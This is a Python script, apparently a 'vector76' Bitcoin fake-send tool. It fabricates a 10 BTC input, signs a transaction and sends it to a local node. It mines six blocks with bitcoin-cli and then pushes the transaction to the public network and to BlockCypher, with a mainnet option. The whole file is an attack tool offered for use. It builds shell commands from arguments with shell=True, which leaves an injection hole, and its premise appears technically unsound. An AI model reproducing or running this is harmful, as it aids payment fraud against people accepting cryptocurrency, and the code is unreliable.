import time
import cryptos
import argparse
import requests
import subprocess
import subprocess

from bitcoinaddress import Wallet
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description="How To Use vector76")

parser.add_argument("send_to",
                    help="Fake send btc to address.",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Max 10 BTC)",
                    type=float)
parser.add_argument("--is_testnet",
                    "-test",
                    help="Testnet flag (Default=True)",
                    default=True,
                    type=bool)


def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def generate_block(address, block, submit=False):
    subprocess.run(f'bitcoin-cli generateblock {address} ["{block}"] {str(submit).lower()}',
                             shell=True,
                             capture_output=True,
                             text=True,
                             check=True)

def send_rawtransaction(hextx):
    result = subprocess.run(f'bitcoin-cli sendrawtransaction {hextx}',
                             shell=True,
                             capture_output=True,
                             text=True,
                             check=True)
    return result.stdout

def broadcast_transaction(raw_tx, testnet):

    url = "https://live.blockcypher.com/btc/pushtx"
    res = requests.get(url).text
    bs = BeautifulSoup(res, 'html.parser')
    csrf_token = bs.find(attrs={'name':'csrfmiddlewaretoken'}).get('value')
    print(csrf_token)
    if testnet:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = raw_tx
        payload = {"tx_hex": raw_tx,
               "coin_symbol": "btc-testnet",
               "csrfmiddlewaretoken": csrf_token}
    else:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = {"tx_hex": raw_tx,
               "coin_symbol": "btc",
               "csrfmiddlewaretoken": csrf_token}

    response = requests.post(url,
                             allow_redirects=True,
                             data=payload,
                             headers=headers)
    print(f"response url : {response.url}")
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")



args = parser.parse_args()
fake_send_from   = Wallet()
to_address   = args.send_to
amount_btc = abs(args.amount_of_coins)
testnet    = args.is_testnet


from_address = fake_send_from.address.mainnet.pubaddr1
if testnet:
    from_address = fake_send_from.address.testnet.pubaddr1
transaction_util = cryptos.Bitcoin(testnet=testnet)
print("OK")

fake_balance = to_satoshi(10)
#1cf66bbba05f25d388bb514297b7b1bc0ba4efc55f099441bcddd85774329f86
inputs  = [{'tx_hash': '2fa860abb71b7f869dec31ec7ae89a62b9924096679ec52da707ad91c0048780', 'tx_pos': 0, 'height': 2870866, 'value': fake_balance, 'address': from_address}]#transaction_util.get_unspents(transaction_util.wiftoaddr(fake_send_from))

send_amount = to_satoshi(amount_btc)

if fake_balance < send_amount:
    print(f"[!] insufficient funds. ")
    exit()

fee = 20000

output   = [{"address": to_address, "value": send_amount}]

tx = transaction_util.mktx_with_change(inputs, output, fee=fee)

print(tx)
if testnet:
    tx = cryptos.serialize(transaction_util.signall(tx, fake_send_from.key.testnet.wif))
else:
    tx = cryptos.serialize(transaction_util.signall(tx, fake_send_from.key.mainnet.wif))

def generate_block(address, block, submit=False):
    subprocess.run(f'bitcoin-cli generateblock {address} \'["{block}"]\' {str(submit).lower()}',
                             shell=True,
                             capture_output=True,
                             text=True,
                             check=True)
    


print()
print("[+] READY...")
print()
print()
print("--------------------")
print(f"Fake Send From                     : {from_address}")
print(f"Fake Send to                       : {to_address}")
print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Signed RawTx                       : {tx}")
print(f"Testnet Mode                       : {testnet}")
print("--------------------")
print()
print()
input("--- Are you sure you want to continue? Press Enter to continue. ---")
print()
print("Send fake transaction your node...")
send_rawtransaction(tx)
print()
print(" --- Fake Transaction Miner Information --- ")
print(fake_send_from)
print(" ------------------------------------------ ")
print()
print(f"Generating Fake Block")
for i in range(6):
    print(f" {i + 1} / 6   ...")
    generate_block(fake_send_from, tx)

print("OK")
print()
print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
print()
time.sleep(3) #..... -u-

print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
print()
time.sleep(2) #..... -u-
transaction_util.pushtx(tx)
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()
sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print("----------------")
print("Done.")
